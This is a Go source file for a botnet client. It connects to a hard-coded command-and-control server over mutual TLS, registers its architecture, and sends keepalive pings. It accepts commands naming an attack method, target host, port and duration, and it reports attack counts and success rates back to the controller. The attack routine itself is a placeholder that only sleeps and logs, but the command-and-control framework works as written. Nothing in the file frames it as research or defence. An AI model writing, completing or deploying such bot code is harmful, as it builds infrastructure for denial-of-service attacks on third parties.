package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io/ioutil"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

const (
	serverAddr    = "172.17.126.64:7002"
	pingInterval  = 7 * time.Second
	statsInterval = 7 * time.Second
)

type BotStats struct {
	StartTime    time.Time
	AttackCount  int
	SuccessCount int
	LastCommand  time.Time
}

var (
	stats       = make(map[string]*BotStats)
	statsLock   sync.Mutex
	currentArch = runtime.GOARCH
	activeConns = make(map[net.Conn]bool)
	connLock    sync.Mutex
)

func main() {
	caCert, err := ioutil.ReadFile("certs/ca.crt")
	if err != nil {
		fmt.Fprintln(os.Stderr, "Error loading CA certificate:", err)
		return
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
	if err != nil {
		fmt.Fprintln(os.Stderr, "Error loading client certificate:", err)
		return
	}

	tlsConfig := &tls.Config{
		RootCAs:      caCertPool,
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
	}

	conn, err := tls.Dial("tcp", serverAddr, tlsConfig)
	if err != nil {
		fmt.Fprintln(os.Stderr, "Error connecting to server:", err)
		return
	}
	defer cleanupConnection(conn)

	registerBot(conn)

	reader := bufio.NewReader(conn)
	for {
		conn.SetReadDeadline(time.Now().Add(2 * pingInterval))
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Fprintln(os.Stderr, "Connection error:", err)
			return
		}

		message = strings.TrimSpace(message)
		if message == "" {
			continue
		}

		if strings.HasPrefix(message, "!") {
			handleCommand(conn, message)
		}
	}
}

func registerBot(conn net.Conn) {
	connLock.Lock()
	activeConns[conn] = true
	connLock.Unlock()

	_, err := conn.Write([]byte(fmt.Sprintf("PONG:%s\n", currentArch)))
	if err != nil {
		fmt.Fprintln(os.Stderr, "Error sending PONG:", err)
		return
	}

	go pingHandler(conn)
	go statsReporter(conn)
}

func cleanupConnection(conn net.Conn) {
	connLock.Lock()
	delete(activeConns, conn)
	connLock.Unlock()
	conn.Close()
}

func pingHandler(conn net.Conn) {
	ticker := time.NewTicker(pingInterval)
	defer ticker.Stop()

	for range ticker.C {
		connLock.Lock()
		if !activeConns[conn] {
			connLock.Unlock()
			return
		}
		connLock.Unlock()

		_, err := conn.Write([]byte("PING\n"))
		if err != nil {
			return
		}
	}
}

func statsReporter(conn net.Conn) {
	ticker := time.NewTicker(statsInterval)
	defer ticker.Stop()

	for range ticker.C {
		connLock.Lock()
		if !activeConns[conn] {
			connLock.Unlock()
			return
		}
		connLock.Unlock()

		statsLock.Lock()
		for ip, stat := range stats {
			successRate := 0.0
			if stat.AttackCount > 0 {
				successRate = float64(stat.SuccessCount) / float64(stat.AttackCount)
			}
			latency := time.Since(stat.LastCommand)
			throughput := float64(stat.AttackCount) / time.Since(stat.StartTime).Seconds()

			_, err := conn.Write([]byte(fmt.Sprintf(
				"!STAT %s %.2f %.2f %.2f %d\n",
				ip,
				latency.Seconds(),
				throughput,
				successRate,
				stat.AttackCount,
			)))
			if err != nil {
				statsLock.Unlock()
				return
			}
		}
		statsLock.Unlock()
	}
}

func handleCommand(conn net.Conn, command string) {
	parts := strings.Fields(command)
	if len(parts) < 4 {
		sendLog(conn, "Invalid command format")
		return
	}

	method := parts[0]
	target := parts[1]
	port := parts[2]
	duration := parts[3]

	statsLock.Lock()
	if _, exists := stats[target]; !exists {
		stats[target] = &BotStats{
			StartTime: time.Now(),
		}
	}
	stats[target].AttackCount++
	stats[target].LastCommand = time.Now()
	statsLock.Unlock()

	dur, err := strconv.Atoi(duration)
	if err != nil || dur <= 0 {
		sendLog(conn, "Invalid duration")
		return
	}

	sendLog(conn, fmt.Sprintf("Starting %s attack on %s:%s", method, target, port))
	time.Sleep(time.Duration(dur) * time.Second)

	statsLock.Lock()
	stats[target].SuccessCount++
	statsLock.Unlock()

	sendLog(conn, fmt.Sprintf("Finished %s attack on %s:%s", method, target, port))
}

func sendLog(conn net.Conn, message string) {
	connLock.Lock()
	defer connLock.Unlock()
	if activeConns[conn] {
		_, err := conn.Write([]byte("!LOG " + message + "\n"))
		if err != nil {
			fmt.Fprintln(os.Stderr, "Error sending log:", err)
		}
	}
}
